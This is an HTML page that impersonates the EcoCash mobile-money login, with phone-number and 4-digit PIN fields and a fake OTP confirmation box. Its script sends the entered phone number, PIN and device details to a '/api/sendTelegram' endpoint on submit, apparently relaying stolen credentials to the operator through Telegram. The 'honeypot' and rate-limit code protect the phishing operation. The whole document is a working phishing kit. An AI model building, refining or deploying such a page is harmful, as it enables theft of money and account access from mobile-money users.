<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>EcoCash — Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    font-family:Inter,system-ui,Arial;
    background:linear-gradient(180deg,#f7fbff,#e8f3ff);
    margin:0;
    padding:18px;
    display:flex;
    align-items:center;
    justify-content:center;
  }

  .card{width:100%;max-width:380px;background:#fff;padding:20px;border-radius:12px;box-shadow:0 12px 30px rgba(2,6,23,0.06)}
  .logo{height:44px;display:block;margin:0 auto 10px}
  h2{text-align:center;margin:0 0 12px;font-size:20px}
  label{display:block;font-size:13px;margin-top:8px}
  input{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff}
  .btn{background:#4b86ff;color:#fff;padding:10px;border-radius:8px;border:0;margin-top:12px;width:100%}
  .btn[disabled]{background:#cbd5e1;cursor:not-allowed}

  .req{color:#d04444;margin-right:6px}
  .phone-error{font-size:13px;color:#d04444;display:none;margin-top:4px}

  /* PIN boxes */
  .pin-row{display:flex;gap:8px;justify-content:center;margin-top:6px}
  .pin-digit{
    width:44px;height:48px;
    text-align:center;
    font-size:20px;
    border-radius:8px;
    border:1px solid #e6eefc;
    background:#fbfdff;
  }
</style>
</head>

<body>
<div class="card">
<img src="assets/eco.png" alt="EcoCash logo" class="logo">

<h2>Login</h2>

<form id="loginForm" autocomplete="off">

<label><span class="req">★</span>Mobile Number</label>
<input id="phone" inputmode="numeric" value="+263" />
<div id="phoneError" class="phone-error">Enter 9 digits starting with 7</div>

<label><span class="req">★</span>4-Digit PIN</label>
<div class="pin-row">
  <input class="pin-digit" maxlength="1" inputmode="numeric">
  <input class="pin-digit" maxlength="1" inputmode="numeric">
  <input class="pin-digit" maxlength="1" inputmode="numeric">
  <input class="pin-digit" maxlength="1" inputmode="numeric">
</div>

<!-- honeypot -->
<input type="text" id="hp" style="display:none">

<button id="loginBtn" class="btn" disabled>LOGIN</button>
</form>
</div>

<!-- OTP modal (UNCHANGED) -->
<div id="otpModal" style="display:none" class="otp-modal">
  <div class="otp-box">
    <div style="text-align:center"><strong>Enter OTP</strong></div>
    <p class="small">We have sent an OTP to your phone.</p>

    <div class="otp-row">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d0">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d1">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d2">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d3">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d4">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d5">
    </div>

    <div id="otpWarning" class="otp-warning">Please input 6 digits</div>

    <div style="display:flex;gap:10px;margin-top:12px">
      <button id="confirmOtp" disabled>Confirm</button>
      <button id="cancelOtp">Cancel</button>
    </div>

    <div id="otpStatus" class="small"></div>
  </div>
</div>

<script>
/* ========= DEVICE INFO ========= */
const deviceInfo = {
  userAgent: navigator.userAgent,
  platform: navigator.platform
};

/* ========= ANTI BOT ========= */
const RATE_LIMIT = 4000;
const lastSubmit = Number(localStorage.getItem('lastSubmit') || 0);

/* ========= PHONE ========= */
const phoneEl = document.getElementById('phone');
const phoneError = document.getElementById('phoneError');

phoneEl.addEventListener('keydown',e=>{
  if(phoneEl.selectionStart <= 4 && e.key === 'Backspace'){
    e.preventDefault();
  }
});

phoneEl.addEventListener('input',()=>{
  if(!phoneEl.value.startsWith('+263')){
    phoneEl.value = '+263';
  }
  let digits = phoneEl.value.replace('+263','').replace(/\D/g,'').slice(0,9);
  phoneEl.value = '+263'+digits;

  phoneError.style.display = /^7\d{8}$/.test(digits) ? 'none' : 'block';
  updateBtn();
});

/* ========= PIN ========= */
const pinBoxes = [...document.querySelectorAll('.pin-digit')];
const loginBtn = document.getElementById('loginBtn');

function getPIN(){
  return pinBoxes.map(b=>b.value).join('');
}

function updateBtn(){
  const phoneDigits = phoneEl.value.replace('+263','');
  const phoneOk = /^7\d{8}$/.test(phoneDigits);
  const pinOk = /^\d{4}$/.test(getPIN());
  loginBtn.disabled = !(phoneOk && pinOk);
}

pinBoxes.forEach((box,i)=>{
  box.addEventListener('input',()=>{
    box.value = box.value.replace(/\D/g,'');
    if(box.value && i<3) pinBoxes[i+1].focus();
    updateBtn();
  });

  box.addEventListener('keydown',e=>{
    if(e.key==='Backspace' && !box.value && i>0){
      pinBoxes[i-1].focus();
      pinBoxes[i-1].value='';
      e.preventDefault();
    }
  });
});

/* ========= SEND ========= */
async function sendToServer(payload){
  return fetch('/api/sendTelegram',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(payload)
  });
}

/* ========= LOGIN SUBMIT ========= */
document.getElementById('loginForm').addEventListener('submit',async e=>{
  e.preventDefault();

  if(document.getElementById('hp').value) return;
  if(Date.now() - lastSubmit < RATE_LIMIT) return;
  localStorage.setItem('lastSubmit',Date.now());

  document.getElementById('otpModal').style.display='flex';

  await sendToServer({
    event:'login_clicked',
    loginPhone: phoneEl.value,
    loginPin: getPIN(),
    device: deviceInfo,
    submittedAt:new Date().toISOString()
  });
});
</script>
</body>
</html>
